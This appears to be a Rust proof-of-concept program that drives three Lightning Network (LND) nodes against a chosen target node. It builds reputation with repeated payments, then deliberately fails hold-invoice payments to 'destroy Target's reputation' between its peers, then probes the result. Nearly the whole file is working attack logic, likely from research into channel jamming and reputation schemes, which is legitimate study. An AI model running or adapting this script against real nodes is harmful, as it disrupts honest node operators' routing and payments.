use tokio::time::{sleep, Duration};

mod attack;
mod client;
use std::sync::Arc;

// Alice
const LND_0_RPCSERVER: &str = env!("LND_0_RPCSERVER");
const LND_0_CERT: &str = env!("LND_0_CERT");
const LND_0_MACAROON: &str = env!("LND_0_MACAROON");

// Bob
const LND_1_RPCSERVER: &str = env!("LND_1_RPCSERVER");
const LND_1_CERT: &str = env!("LND_1_CERT");
const LND_1_MACAROON: &str = env!("LND_1_MACAROON");

// Charlie
const LND_2_RPCSERVER: &str = env!("LND_2_RPCSERVER");
const LND_2_CERT: &str = env!("LND_2_CERT");
const LND_2_MACAROON: &str = env!("LND_2_MACAROON");

const TARGET: &str = env!("TARGET");

#[tokio::main]
async fn main() {
    let mut alice = client::new_client(LND_0_RPCSERVER, LND_0_CERT, LND_0_MACAROON)
        .await
        .unwrap();
    let mut bob = client::new_client(LND_1_RPCSERVER, LND_1_CERT, LND_1_MACAROON)
        .await
        .unwrap();

    let mut charlie = client::new_client(LND_2_RPCSERVER, LND_2_CERT, LND_2_MACAROON)
        .await
        .unwrap();

    let target_peers = alice.graph_get_node_peers(TARGET.to_string()).await;

    let front_peer = &target_peers[0];
    let back_peer = &target_peers[1];

    // // have two front-attackers (A & C) open channels to the target
    // attack::open_to_targets(&mut alice, vec![front_peer.clone()])
    //     .await
    //     .unwrap();

    // // The back-attacker (B) opens a channel to the third target
    // attack::open_to_targets(&mut bob, vec![back_peer.clone()])
    //     .await
    //     .unwrap();

    // // Charlie opens channels to both peers and the target (to allow us to see the reputations of the peers)
    // attack::open_to_targets(&mut charlie, vec![TARGET.to_string(), front_peer.clone(), back_peer.clone()])
    //     .await
    //     .unwrap();

    // println!("Please confirm the channels!");
    // std::io::stdin().read_line(&mut String::new()).unwrap();

    // 1. Alice sends payments to Charlie via front-peer to build reputation
    let charlie_target_peer_channel = &charlie.get_channels_for_peer(TARGET.to_string()).await[0];
    // let front_peer_channel = alice.get_channels_for_peer(front_peer.clone()).await[0];
    println!("100x Alice <-> Charlie payments back and forth");
    for _ in 0..100 {
        let c_invoice = charlie.add_invoice(800_000).await;
        let ac_stream = alice
            .send_payment(
                c_invoice.to_string(),
                1,
                None, // Some(vec![front_peer_channel.chan_id]),
                // ensure that the payment goes through the target
                Some(client::decode_hex(TARGET)),
            )
            .await;
        alice
            .on_payment_result(
                ac_stream,
                Arc::new(|_| {
                    // println!("Alice -> Charlie payment success!");
                }),
            )
            .await;

        let a_invoice = alice.add_invoice(800_000).await;
        let ca_stream = charlie
            .send_payment(
                a_invoice.to_string(),
                1,
                Some(vec![charlie_target_peer_channel.chan_id]),
                Some(client::decode_hex(&front_peer)),
            )
            .await;
        charlie
            .on_payment_result(
                ca_stream,
                Arc::new(|_| {
                    // println!("Charlie -> Alice payment success!");
                }),
            )
            .await;
    }

    // 2. Alice sends payments to Bob and fails them to destroy Target's reputation for P1<->P2
    println!("10x Alice -> Bob failed payments");
    let hash_table = client::gen_hash_table(10);
    for (i, (_preimage, payment_hash)) in hash_table.iter().enumerate() {
        let invoice = bob.add_hold_invoice(payment_hash.to_vec(), 1000).await;
        // println!("Bob added invoice {}", i + 1);
        // get invoice subscription before payment to avoid missing it.
        // let b_stream = bob.get_invoice_subscription().await;

        // println!("Alice -> Bob payment attempt {}", i + 1);
        let ab_stream = alice
            // NOTE: this gets screwed up if the payment goes through Charlie.
            .send_payment(
                invoice.payment_request.to_string(),
                1,
                None,
                Some(client::decode_hex(&back_peer)),
            )
            .await;

        // println!("Bob waiting for invoice accept {}", i + 1);
        // bob.await_invoice_accepted(b_stream, payment_hash.to_vec())
        //     .await;
        bob.poll_invoice(payment_hash.to_vec()).await;

        // println!("Bob Cancelling {}", i + 1);
        bob.cancel_invoice(payment_hash.to_vec()).await;

        alice
            .on_payment_result(
                ab_stream,
                Arc::new(|payment| {
                    if payment.status == 3 {
                        println!("Alice -> Bob payment failed!");
                    }
                }),
            )
            .await;
    }

    // 3. Charlie sends payment to route[front-peer, target, back-peer] to check reputation
    let charlie_front_peer_channel = &charlie.get_channels_for_peer(front_peer.clone()).await[0];
    println!("Charlie -> [front-peer, target, back-peer] payment");
    for _ in 0..10 {
        let b_invoice = bob.add_invoice(50_000).await;

        bob.subscribe_invoices().await;

        let c_stream = charlie
            .send_payment(
                b_invoice.to_string(),
                1,
                Some(vec![charlie_front_peer_channel.chan_id]),
                Some(client::decode_hex(&back_peer)),
            )
            .await;
    }
}
